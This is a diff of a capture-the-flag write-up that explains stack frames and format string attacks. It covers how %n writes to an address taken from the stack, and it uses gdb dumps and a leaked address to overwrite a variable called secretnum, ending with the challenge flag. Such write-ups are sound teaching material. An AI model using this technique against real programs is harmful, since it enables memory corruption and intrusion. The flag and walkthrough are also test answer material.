@@ -39,34 +39,44 @@ This problem requires a firm grasp of memory structure (how programs use memory,
 
 This problem also requires intimate knowledge on format string attacks. 
 
-___
+<details>
+    <summary>
+   	 **Stack Explanation**
+    </summary>
+	
+  ![logo](https://i.stack.imgur.com/zgw0O.png)
 
-This section will first detail an explanation on how programs use memory. Specifically, how each function separates itself into different portions on the stack.
-
-TLDR;
-
-![logo](https://i.stack.imgur.com/zgw0O.png)
-
-1. Programs store data on stack (resides on RAM). Their structure resembles that of the image. For this problem, we are looking specifically at the stack frame for pwn(), where fixed-size variables are stored.
+  1. Programs store data on stack (resides on RAM). Each program may have different functions; and each function has a memory  structure resembling that of the image. For this problem, we are looking specifically at the stack frame for pwn(), where fixed-size variables are stored.
 
 
-	int secretnum = (rand() % 1000000) + 1000000;
-    char buf[sizeOfBuf];
-2. `secretnum` and `buf` are two such fixed-size variables that are stored onto the stack. Our goal is to override `secretnum` using the format string vulnerability present to get a value of 50. (Covered later)
+      int secretnum = (rand() % 1000000) + 1000000;
+      char buf[sizeOfBuf];
+  2. `secretnum` and `buf` are two such fixed-size variables that are stored onto the stack. Our goal is to override `secretnum` using the format string vulnerability present to get a value of 50. (Covered later)
+</details>
 
-___
+<details>
+	<summary>
+    	**Format String attacks**
+    </summary>
 
-Now, this section will talk about format string attacks. This attack are commonly executed against `printf` statements (or equivalent "Format Functions" eg `sprintf`), when inputs are passed in directly as an argument to the format function. (eg `char str[20]="%d%d%d"; printf(str);`)
+This attack are commonly executed against `printf` statements (or equivalent "Format Functions" eg `sprintf`), when inputs are passed in directly as an argument to the format function. (eg `char str[20]="%d%d%d"; printf(str);` which results in `printf("%d%d%d");` )
 
-What usually happens with a format function is that it pushes its arguments to the top of the stack. For example, `int num=5; printf("%d, num");` would push 5 to the top of the stack, and %d tells the printf function to look through the top 32 bits (a 4 byte integer, which is what %d represents) and use that as the value to print. In this case, it would be 5.
+What usually happens with a format function is that it pushes its arguments to the top of the stack. For example, `int num=5; printf("%d, num");` would push 5 to the top of the stack, and `%d` tells the printf function to look through the top 32 bits (a 4 byte integer, which is what `%d` represents) and use that as the value to print. In this case, it would be 5.
 
 Omitting the `num` argument to `printf` would still result in printf searching through the 4 bytes of the stack. However, the number 5 is not pushed to the stack. This results in printf returning whatever is currently at the top of the stack, allowing an attacker to read arbitrary values.
 
 Subsequent `%d` tokens would allow an attacker to continue reading down the stack, so for example `%d%d` would read 2 integers, or 8 bytes worth of data.
 
 Also notable is the `%n` token in `printf()`, which will read 4 bytes of data from the stack and interpret it as a memory address, instead of a value(which `%d` does). `%n` writes the number of characters printed by the `printf()` function to the address derived from the stack . For example, if `%n` reads in `0xffffd8d8` as the next 4 bytes, and `printf()` printed "asdasdasd", it would write the value 9 into the memory address 0xffffd8d8.
+</details>
 
-___
+<details>
+	<summary>
+		**Exploitation**
+    </summary>
+    
+    
+# [IMPORTANT: ENV VARIABLES PUSHED ONTO STACK MAY AFFECT YOUR ADDRESS OF `secretnum`! THIS EXPLOIT MAY NOT WORK FOR YOUR COMPUTER UNLESS YOU HAVE ADAPTED IT APPROPRIATELY! (aka target the program in a "constant" environment!)](https://stackoverflow.com/questions/32771657/gdb-showing-different-address-than-in-code)
 
 With these two pieces of information, exploitation is now possible.
 
@@ -77,11 +87,11 @@ When first connecting to the program, we get the following message.
     Before you start, please tell me your name (256 chars max): 
     (psst, this aint no magic trick, he's tricky!) 0xffffdd24
 
-Notable is the `0xffffdd24` value printed. It corresponds to a memory address! Looking at the source code, there is a line:
+Notable is the `0xffffdd24` value printed (**THIS IS THE ADDRESS FOR MY PROGRAM YOURS MAY DIFFER**). It corresponds to a memory address! Looking at the source code, there is a line:
 
     printf("(psst, this aint no magic trick, he's tricky!) %p\n",&secretnum);
 	
-This shows the address of `secretnum`! This will be useful later. (address of where variables are stored differ because of environmental variables: you'll find that the address on the server and your own computer slightly different, which necessitates this particular information)
+This shows the address of `secretnum`! This will be useful later. (**address of where variables are stored differ because of environmental variables**: you'll find that the address on the server and your own computer slightly different, which necessitates this particular information)
 
 Inspecting the code, we also find these lines of interest:
     
@@ -98,6 +108,11 @@ There is a format string vulnerability here! Users can enter any input into the 
 
 Now would be a good time to inspect what the stack looks like when the program is running. Load up the trusty `gdb`.
 
+<details>
+	<summary>
+    	`GDB dump`
+    </summary>
+    
 	gdb magic2-distrib
     GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
     Copyright (C) 2016 Free Software Foundation, Inc.
@@ -254,9 +269,18 @@ Now would be a good time to inspect what the stack looks like when the program i
     Continuing.
     256 -134519392 0 622879781 1680154724 543434016
     's prediction:
-    
+
+
+</details>
+
 This section of `gdb's` output should be examined more closely:
+ 
+<details>
+	<summary>
+    	`GDB dump`
+    </summary>
     
+ 
     (gdb) break *pwn+265 			<-------------------------------------------- note: printf(buf) statement
     Breakpoint 1 at 0x8048711
     (gdb) run
@@ -277,12 +301,20 @@ This section of `gdb's` output should be examined more closely:
     256 -134519392 0 622879781 1680154724 543434016
     's prediction:
     
+
+</details>
+    
+    
 Using `gdb` to stop the program before the `printf()` statement was executed, the stack was examined with `x/10dw $esp`, which prints the first 10 integers off the top of the stack. After the `printf()` statement executed, it was found that the values `256`, `-134519392` and so on corresponded with the 6 `%d` tokens.
 
 This proves a format string vulnerability, but what input would be required to change the address of `secretnum`?
 
 Turns out, the `buf` char array is stored in the stack starting at the address `0xffffce430` (Notice the repeated 0x73 hex values, which is the hex value for the character `s`)
-
+<details>
+	<summary>
+    	`GDB dump`
+    </summary>
+    
 	(gdb) run
 	The program being debugged has been started already.
 	Start it from the beginning? (y or n) y
@@ -305,6 +337,10 @@ Turns out, the `buf` char array is stored in the stack starting at the address `
 	0xffffcea0:	0xf7fe3a70	0x08048248	0xf7e35371	0xf7fb6000
 	0xffffceb0:	0xf7fe3a70	0x08048278	0x00000001	0xf7ffd918
 	0xffffcec0:	0x0804a02c	0xf7fe88a2	0xf7ffdad0	0xf7fd4490
+
+
+</details>
+
 
 Now the value of `secretnum` at the address `0xffffdd24` must be overwritten to get the flag.
 
@@ -343,6 +379,7 @@ Direct the contents of the `attack` file into the program stdin to get the flag.
 	's prediction: Magic??
 	GCTF{unl1k3ly_y0ull_us3_th15_0uts1d3_0f_ctf5}
 
+</details>
 
 ### Flag
 `GCTF{unl1k3ly_y0ull_us3_th15_0uts1d3_0f_ctf5}`
